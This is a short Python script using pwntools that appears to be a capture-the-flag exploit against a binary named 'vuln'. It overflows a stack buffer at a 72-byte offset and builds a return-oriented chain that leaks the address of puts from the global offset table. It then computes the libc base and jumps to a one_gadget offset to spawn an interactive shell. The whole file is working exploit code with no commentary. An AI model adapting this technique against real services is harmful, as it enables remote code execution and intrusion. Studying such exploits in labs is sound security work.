from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')	

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *0x40111b",
		"c"
	]))
elif args.REMOTE:
	p = remote("", )
else:
	p = process(elf.path) 


OFFSET = 72
POP_RDI = 0x0000000000401273

payload = b'A' * OFFSET
payload += p64(POP_RDI)
payload += p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

p.recvline()
p.sendline(payload)
p.recvline()


libc_leak = p.recvline().strip()
print(libc_leak)
libc_leak = u64(libc_leak.ljust(8, b'\x00'))- libc.symbols['puts']

print(f"[+] libc leak: {hex(libc_leak)}")
libc.address = libc_leak 

payload = b'A' * OFFSET
payload += p64(libc_leak + 0xe6c81)
p.sendline(payload)

p.interactive()
